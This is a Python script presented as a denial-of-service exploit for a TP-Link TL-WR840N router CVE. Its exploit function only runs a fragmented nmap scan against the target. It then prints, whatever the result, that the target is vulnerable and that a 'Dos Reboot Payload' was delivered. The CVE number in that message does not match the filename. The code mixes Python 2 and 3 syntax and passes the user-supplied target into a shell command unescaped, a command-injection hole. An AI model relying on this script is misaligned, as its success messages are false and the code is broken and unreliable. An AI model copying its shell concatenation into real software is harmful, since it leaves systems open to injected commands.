#device: tl-wr840n firmware: 0.9.1 4.16
import subprocess
import sys
from colorama import Fore

description= r"""
 -----------------------------------------------------------------------------
|                                                                            |
|                                                                            |
|                                                                            |
|                                 Hyo-In                                     |
|                                                                            |
|                                                                            |
|                                                                            |
 -----------------------------------------------------------------------------
"""

def exploit(target):
	res = subprocess.check_output('nmap -f ' + target, shell=True)
	print res
	print(Fore.GREEN+"[+] Vulnerable to CVE-2018-158402"+Fore.RESET)
	print(Fore.GREEN+"[+] Dos Reboot Payload"+Fore.RESET)
	
if __name__ == "__main__":
	print(description)
	if len(sys.argv) is not 2:
		print(Fore.YELLOW+"[-] Example: python cve-2018-15840.py <Target IP>"+Fore.RESET)
		sys.exit()
	else:
		exploit(sys.argv[1])
